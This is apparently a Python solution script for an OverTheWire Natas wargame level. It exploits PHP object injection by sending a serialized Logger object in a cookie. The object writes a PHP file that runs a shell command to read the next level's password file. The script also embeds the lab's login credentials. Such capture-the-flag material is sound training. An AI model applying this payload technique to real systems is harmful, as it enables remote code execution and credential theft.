# Vulnerability: PHP Object Injection (Insecure Deserialization)

import requests
import colorama
from colorama import Fore, Style


# Initialize colorama for colored console output
colorama.init(autoreset=False)
print(Fore.LIGHTBLUE_EX, Style.BRIGHT)

# Set the username and password for authentication
username = 'natas26'
password = '8A506rfIAXbKKk68yJeuTuRq4UfcK70k'

# Construct the URL using the given username
url = f'http://{username}.natas.labs.overthewire.org/'

# GET Request parameters
params = {"x1": "4", "y1": "4", "x2": "10", "y2": "10"}

# Create a session and set the authorization credentials
session = requests.Session()

# Set the authorization credentials using HTTP Basic Auth
session.auth = (username, password)
session.get(url=url)

# PHP Object Injection in drawing cookie
session.cookies['drawing'] = "Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxNjoiaW1nL3Bhc3N3b3JkLnBocCI7czoxNToiAExvZ2dlcgBpbml0TXNnIjtzOjUwOiI8P3BocCBzeXN0ZW0oJ2NhdCAvZXRjL25hdGFzX3dlYnBhc3MvbmF0YXMyNycpOyA/PiI7czoxNToiAExvZ2dlcgBleGl0TXNnIjtzOjUwOiI8P3BocCBzeXN0ZW0oJ2NhdCAvZXRjL25hdGFzX3dlYnBhc3MvbmF0YXMyNycpOyA/PiI7fQ=="

resp = session.get(url=url + "/img/password.php")
print(f"Natas 27: {resp.text[:32]}")
